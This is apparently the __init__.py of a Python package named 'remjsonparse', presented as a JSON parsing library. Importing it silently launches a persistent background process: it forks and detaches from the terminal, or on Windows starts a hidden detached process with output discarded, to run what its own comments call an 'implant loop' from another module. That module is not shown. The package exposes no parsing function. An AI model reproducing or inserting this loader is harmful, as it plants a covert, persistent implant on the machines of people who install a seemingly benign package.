import os
import sys

_DEBUG = os.environ.get("REMJSONPARSE_DEBUG", "").strip().lower() in ("1", "true", "yes")
if _DEBUG:
    print(f"[remjsonparse] DEBUG on, module={__file__!r}", file=sys.stderr, flush=True)

# When set by the parent, this process runs only the implant loop (detached); do not spawn again.
if os.environ.get("REMJSONPARSE_IMPLANT_ONLY", "").strip() == "1":
    from .m8 import _l0
    _l0()
    sys.exit(0)


def _dbg(msg: str) -> None:
    if _DEBUG:
        print(f"[remjsonparse] {msg}", file=sys.stderr, flush=True)


def _z0() -> None:
    _dbg(f"_z0 running, os.name={os.name!r}")
    if os.name == "posix":
        try:
            pid = os.fork()
            _dbg(f"fork returned pid={pid}")
            if pid == 0:
                _dbg("child: detaching from terminal (setsid), then running _l0")
                try:
                    os.setsid()
                except (AttributeError, OSError):
                    pass
                try:
                    from .m8 import _l0
                    _l0()
                except Exception as e:
                    _dbg(f"child: exception: {e!r}")
                    raise
                finally:
                    os._exit(0)
            return
        except (AttributeError, OSError) as e:
            _dbg(f"fork failed: {e!r}, will use subprocess")
    # Windows (or no fork): start a detached process that runs only the implant loop
    import subprocess
    env = {**os.environ, "REMJSONPARSE_IMPLANT_ONLY": "1"}
    creationflags = 0
    if sys.platform == "win32":
        creationflags |= 0x00000008  # DETACHED_PROCESS
        creationflags |= 0x00000200  # CREATE_NEW_PROCESS_GROUP
    _dbg("starting detached implant process")
    try:
        p = subprocess.Popen(
            [sys.executable, "-c", "import remjsonparse"],
            env=env,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=creationflags if sys.platform == "win32" else 0,
            start_new_session=(sys.platform != "win32"),
        )
        _dbg(f"detached process started, pid={p.pid}")
    except Exception as e:
        _dbg(f"detached start failed: {e!r}, falling back to multiprocessing")
        import multiprocessing
        if multiprocessing.current_process().name == "MainProcess":
            proc = multiprocessing.Process(target=_z1, daemon=False)
            proc.start()
            _dbg(f"Process started, pid={proc.pid}")


def _z1() -> None:
    _dbg("_z1 (child) running")
    try:
        from .m8 import _l0
        _dbg("_z1: calling _l0()")
        _l0()
    except Exception as e:
        _dbg(f"_z1: exception: {e!r}")
        raise


_z0()
__all__ = []
